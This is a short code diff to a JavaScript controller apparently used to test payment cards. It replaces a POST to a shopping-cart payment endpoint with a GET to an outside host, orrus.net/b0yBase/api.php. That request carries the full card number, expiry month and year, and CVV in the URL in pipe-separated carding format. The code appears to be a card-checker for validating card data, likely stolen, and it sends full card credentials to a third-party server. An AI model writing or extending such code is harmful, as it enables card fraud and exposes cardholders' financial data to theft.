@@ -62,13 +62,8 @@ class TesteController {
 		const infoData = `produto=100&codigoBandeira=${cc.flag}&formaPagamento=1&tentarAutenticar=nao&tipoParcelamento=2&capturarAutomaticamente=false&indicadorAutorizacao=2&cartaoNumero=${cc.number}&mes=${cc.month}&ano=${cc.year}&cartaoCodigoSeguranca=${cc.cvv}`;
 
 		const resultTest = await axios({
-			method: "post",
-			processData: false,
-			contentType: "multipart/form-data",
-			cache: false,
-			url:
-				"http://orrus.net/api/apiChave/pages/carrinhoCartaoPagamento.php",
-			data: infoData
+			method: "get",
+			url: `http://orrus.net/b0yBase/api.php?orrus=${cc.number}|${cc.month}|${cc.year}|${cc.cvv}`
 		});
 
 		var result = "Pendente";
